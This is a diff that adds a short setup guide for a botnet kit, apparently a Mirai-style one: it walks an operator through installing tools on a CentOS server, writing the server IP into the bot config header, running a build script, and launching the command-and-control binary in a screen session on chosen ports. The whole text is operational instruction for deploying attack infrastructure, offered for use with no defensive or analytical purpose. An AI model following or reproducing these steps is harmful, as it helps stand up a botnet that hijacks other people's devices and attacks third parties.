@@ -1,0 +1,22 @@
+this botnet is the most simple botnet to setup,
+if you cant do it i swear to god.
+
+Suggested OS; CentOS (Any version of your choosing)
+
+Make sure every file is uploaded to your server.
+
+Setup:
+yum install python wget nano -y
+nano bot/headers/config.h
+(Put your VPS/Server IP in there and use ctrl + x to exit)
+python cc7.py 127.0.0.1 (replace 127.0.0.1 with your vps IP)
+
+then find the executable cnc file and execute it like this
+(its probably in /root/ or /root/cnc you can enter those directories
+by doing cd /root/ or cd /root/cnc/)
+
+then give it exec perms by doing:
+chmod +x cnc
+
+then screen it by doing:
+screen ./cnc 911 700 [a port of your choosing]
